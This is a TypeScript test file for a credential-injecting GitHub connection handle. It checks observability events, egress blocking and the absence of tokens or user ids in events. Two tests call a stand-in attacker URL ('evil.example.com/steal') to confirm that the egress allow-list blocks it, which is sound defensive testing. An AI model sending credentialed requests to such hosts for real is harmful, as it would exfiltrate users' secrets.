import { test } from 'node:test';
import assert from 'node:assert/strict';
import { randomBytes } from 'node:crypto';
import { openDb } from '../src/core/db';
import { Vault } from '../src/core/vault';
import { Audit } from '../src/core/audit';
import { ConnectionHandle, type VouchrEvent } from '../src/core/injector';
import { github } from '../src/core/providers';
import { userOwner } from '../src/core/owner';
import type { SlackIdentity } from '../src/core/identity';

const KEY = randomBytes(32);
const ID: SlackIdentity = { enterpriseId: null, teamId: 'T1', userId: 'U1' };
const O1 = userOwner(ID);
const TOKEN = 'tok_secret_xyz'; // the value that must never appear in any event

// Build a handle wired to a sink that records every event, with a vaulted github cred.
async function handleWithSink(sink: (e: VouchrEvent) => void) {
  const db = await openDb({ dbPath: ':memory:' });
  const vault = new Vault(db, KEY);
  const audit = new Audit(db);
  const provider = github({ clientId: 'cid', clientSecret: 'csec' }); // egressAllow: api.github.com
  await vault.upsert(O1, 'github', { accessToken: TOKEN, refreshToken: null, scopes: 'repo', expiresAt: null, externalAccount: null });
  return new ConnectionHandle(provider, O1, ID, vault, audit, {}, new Map(), sink);
}

test('observability: injected fires with host/status/ownerKind on a successful fetch', async () => {
  const events: VouchrEvent[] = [];
  const handle = await handleWithSink((e) => events.push(e));
  const realFetch = globalThis.fetch;
  globalThis.fetch = (async () => new Response('{}', { status: 200, headers: { 'content-type': 'application/json' } })) as any;
  try {
    const res = await handle.fetch('https://api.github.com/user');
    assert.equal(res.status, 200);
  } finally {
    globalThis.fetch = realFetch;
  }
  assert.deepEqual(events, [{ type: 'injected', provider: 'github', host: 'api.github.com', status: 200, ownerKind: 'user' }]);
});

test('observability: egress_denied fires AND the fetch still throws for a disallowed host', async () => {
  const events: VouchrEvent[] = [];
  const handle = await handleWithSink((e) => events.push(e));
  await assert.rejects(() => handle.fetch('https://evil.example.com/steal'), /Egress blocked/);
  assert.deepEqual(events, [{ type: 'egress_denied', provider: 'github', host: 'evil.example.com' }]);
});

test('observability: no event ever carries a token, user id, or team id', async () => {
  const events: VouchrEvent[] = [];
  const handle = await handleWithSink((e) => events.push(e));
  const realFetch = globalThis.fetch;
  globalThis.fetch = (async () => new Response('{}', { status: 200 })) as any;
  try {
    await handle.fetch('https://api.github.com/user'); // injected
    await assert.rejects(() => handle.fetch('https://evil.example.com/x')); // egress_denied
  } finally {
    globalThis.fetch = realFetch;
  }
  assert.ok(events.length >= 2);
  for (const e of events) {
    const blob = JSON.stringify(e);
    assert.ok(!blob.includes(TOKEN), `event leaked token: ${blob}`);
    assert.ok(!blob.includes(ID.userId), `event leaked user id: ${blob}`);
    assert.ok(!blob.includes(ID.teamId), `event leaked team id: ${blob}`);
  }
});

test('observability: a throwing sink does not break handle.fetch', async () => {
  const handle = await handleWithSink(() => { throw new Error('bad sink'); });
  const realFetch = globalThis.fetch;
  globalThis.fetch = (async () => new Response('{}', { status: 200 })) as any;
  try {
    const res = await handle.fetch('https://api.github.com/user');
    assert.equal(res.status, 200); // sink blew up, request unaffected
  } finally {
    globalThis.fetch = realFetch;
  }
});
